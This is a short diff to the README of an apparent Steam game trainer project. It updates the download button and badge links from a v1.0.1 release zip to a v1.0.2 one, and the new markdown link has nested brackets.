@@ -7,9 +7,9 @@
 [![Store](https://img.shields.io/badge/store-Steam-1b2838)](#compatibility)
 [![License](https://img.shields.io/badge/license-MIT-e0c17a)](LICENSE)
 
-> **[⬇ Download the latest Big Walk trainer](https://github.com/YarnPikeman60/Big-Walk-Trainer/releases/latest)**
+> **[⬇ Download the latest Big Walk trainer]([https://github.com/YarnPikeman60/Big-Walk-Trainer/releases/latest](https://github.com/YarnPikeman60/Big-Walk-Trainer/releases/download/v1.0.2/BigWalkTrainer.zip))**
 <p align="center">
-    <a href="https://github.com/YarnPikeman60/Big-Walk-Trainer/releases/download/v1.0.1/BigWalkTrainer.zip">
+    <a href="https://github.com/YarnPikeman60/Big-Walk-Trainer/releases/download/v1.0.2/BigWalkTrainer.zip">
         <img src="assets/example1.png" width="100%" alt="Download Big Walk Trainer">
     </a>
 </p>
